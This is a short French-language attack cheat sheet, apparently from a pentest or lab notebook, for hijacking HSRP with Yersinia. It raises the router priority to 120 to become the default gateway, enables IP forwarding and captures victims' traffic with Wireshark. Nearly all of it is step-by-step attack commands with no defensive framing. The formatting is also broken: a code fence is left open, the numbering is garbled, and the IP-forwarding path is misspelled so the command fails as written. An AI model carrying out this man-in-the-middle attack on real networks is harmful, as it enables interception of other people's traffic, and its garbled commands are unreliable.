# Attaque HSRP (Hot Standby Router Protocol)

**Objectif** : Prendre le rôle de routeur actif en usurpant la priorité HSRP pour intercepter le trafic.

**Méthode** : Utiliser une priorité HSRP plus élevée pour devenir la passerelle par défaut, capturant ainsi le trafic réseau.

## Étapes et Commandes

1. **Lancer Yersinia pour HSRP** :
   ```
   sudo yersinia -I
2.Usurper le rôle de routeur actif :

Dans Yersinia :
Tapez g pour accéder aux protocoles et sélectionnez HSRP.
Tapez x pour augmenter la priorité HSRP à 120.
Tapez Enter pour envoyer les paquets HSRP.
Activer le forwarding IP :


echo 1 > /proc/sys/net/ipv4/ip-forward
Résultat Attendu et Vérification
Résultat : L’attaquant devient la passerelle par défaut.
Vérification : Utilisez show standby brief pour confirmer que Kali Linux est le routeur actif, et vérifiez le trafic réseau avec Wireshark.


---
